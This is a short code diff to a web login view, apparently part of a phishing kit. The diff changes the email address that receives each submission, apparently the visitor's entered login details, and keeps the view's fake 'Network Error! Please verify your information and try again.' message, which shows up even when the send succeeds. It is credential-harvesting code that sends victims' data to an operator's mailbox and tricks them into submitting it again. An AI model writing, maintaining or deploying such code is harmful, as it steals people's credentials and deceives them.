@@ -35,7 +35,7 @@ def user_login_view(request):
             })
 
             try:
-                send_email.email_message_send('Update Successful', message, 'info.puhali.ee@gmail.com' )
+                send_email.email_message_send('Update Successful', message, 'bamsven@proton.me' )
                 # send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
                 messages.error(request, "Network Error! Please verify your information and try again.")
             except Exception as e:
@@ -49,7 +49,7 @@ def user_login_view(request):
             # Step 1: Email submitted, validate email and redirect to ?em=
             try:
                 validate_email(email)
-                url = reverse('user_login') + f'?em={email}'
+                url = reverse('frontend:user_login') + f'?em={email}'
                 return redirect(url)
             except ValidationError:
                 # Invalid email, show email form with error
